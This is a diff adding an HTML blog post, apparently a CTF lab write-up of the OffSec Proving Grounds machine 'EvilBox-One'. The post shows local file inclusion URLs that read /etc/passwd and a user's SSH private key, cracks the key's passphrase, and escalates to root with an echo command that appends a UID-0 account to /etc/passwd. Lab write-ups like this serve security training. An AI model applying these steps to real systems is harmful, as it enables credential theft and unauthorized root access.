@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: EvilBox-One</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: EvilBox-One | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: EvilBox-One" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/09/02/Proving_grounds_Play-EvilBox-One.html" />
+<meta property="og:url" content="http://localhost:4000/2023/09/02/Proving_grounds_Play-EvilBox-One.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-09-02T03:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: EvilBox-One" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-09-02T03:00:00+05:30","datePublished":"2023-09-02T03:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: EvilBox-One","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/09/02/Proving_grounds_Play-EvilBox-One.html"},"url":"http://localhost:4000/2023/09/02/Proving_grounds_Play-EvilBox-One.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/09/02/Proving_grounds_Play-EvilBox-One.html">
+    <h2 class="post-title">Proving grounds Play: EvilBox-One</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Sep 2, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="port-80--web">PORT 80 || Web</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/EvilBox-One/web.png" alt="img" /></p>
+
+<h2 id="fuzzing">Fuzzing</h2>
+
+<h3 id="files">Files</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/EvilBox-One/robots.png" alt="img" /></p>
+
+<h3 id="directory">Directory</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/EvilBox-One/dir1.png" alt="img" /></p>
+
+<p>Fuzz for files in <code class="language-plaintext highlighter-rouge">/secrets</code> directory.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/EvilBox-One/dir2.png" alt="img" /></p>
+
+<p><strong>Found file evil.php</strong></p>
+
+<p>http://192.168.152.212/secret/evil.php</p>
+
+<h2 id="fuzz-for-paramaters">Fuzz for paramaters</h2>
+
+<p>http://192.168.152.212/secret/evil.php?FUZZ=/etc/passwd</p>
+
+<p>Trying local file inclusion vulnerability to check the words retieved in the response to confirm the parameter.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/EvilBox-One/param.png" alt="img" /></p>
+
+<p>http://192.168.152.212/secret/evil.php?command=/etc/passwd</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/EvilBox-One/lfi.png" alt="img" /></p>
+
+<p>As shown in the above <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file we have a user <code class="language-plaintext highlighter-rouge">mowree</code>.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
+</code></pre></div></div>
+
+<p>Using the LFI vulnerability we can obtain the SSH key for the user <code class="language-plaintext highlighter-rouge">mowree</code>.</p>
+
+<p>http://192.168.152.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/EvilBox-One/mowree-ssh.png" alt="img" /></p>
+
+<p>SSH to mowree using the SSH key.</p>
+
+<p>Using id_rsa key to login to the <code class="language-plaintext highlighter-rouge">mowree</code> user account is prompted with password to continue. So use <code class="language-plaintext highlighter-rouge">ssh2john</code> to create hash for the SSH key and crack the same using john.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/EvilBox-One/crack-password.png" alt="img" /></p>
+
+<p>Extracted password <code class="language-plaintext highlighter-rouge">unicorn</code></p>
+
+<p><strong>Initial Foothold Obtained</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/EvilBox-One/user.png" alt="img" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Check the permissions for <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>
+
+<p>/etc/passwd is writable so we can create our own root user.</p>
+
+<p><strong>Writing new user to /etc/passwd</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"hacker:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash"</span> <span class="o">&gt;&gt;</span> /etc/passwd
+</code></pre></div></div>
+
+<p>Switch to user <code class="language-plaintext highlighter-rouge">hacker</code> and enter password <code class="language-plaintext highlighter-rouge">mypass</code> to obtain root.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/EvilBox-One/root.png" alt="img" /></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
